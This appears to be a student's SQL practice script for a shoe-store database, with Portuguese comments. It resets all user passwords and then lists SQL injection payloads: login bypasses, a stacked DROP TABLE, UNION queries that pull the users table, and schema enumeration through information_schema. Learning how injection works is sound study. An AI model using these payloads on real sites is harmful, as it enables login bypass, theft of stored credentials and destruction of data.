SELECT * FROM bdsapataria.tbl_usuarios;

SET SQL_SAFE_UPDATES = 0;

UPDATE tbl_usuarios SET senha = 123; 

#SELECTS PARA USAR EM SEGURANÇA
-- ' or 1 = 1;
-- 105 OR 1 = 1;

-- Somente isso deve ser incluso na query de senha: ' or ''=' FUNCIONA
-- login: ` OR 1 = 1; /* e senha: */--
-- ' or "='
SELECT * FROM tbl_usuarios;
SELECT * FROM tbl_usuarios WHERE usuario = 'admin';-- senha = '123';
SELECT * FROM tbl_usuarios WHERE usuario = 105 OR 1 = 1;
SELECT * FROM tbl_usuarios WHERE usuario = 1; DROP TABLE tbl_usuarios;


-- Exemplo de SQL de injeção no banco de dados
-- camiseta' AND 0=1 UNION ALL SELECT * FROM tbl_usuarios WHERE '1' LIKE '1
-- 10; DROP tbl_produtos-- 


SELECT table_name FROM information_schema.tables WHERE table_schema = 'bdsapataria';

SELECT table_name, column_name FROM information_schema.columns WHERE table_name = 'tbl_usuarios';

SELECT * FROM tbl_clientes WHERE nome LIKE '%camiseta' AND 0=1 UNION ALL SELECT * FROM information_schema.tables WHERE table_schema LIKE 'a%';

SELECT * FROM tbl_clientes WHERE nome LIKE '%camiseta' AND 0=1 UNION ALL SELECT * FROM tbl_usuarios WHERE '1' LIKE '1%';

-- camiseta' AND 0=1 UNION ALL SELECT * FROM tbl_usuarios WHERE '1' LIKE '1
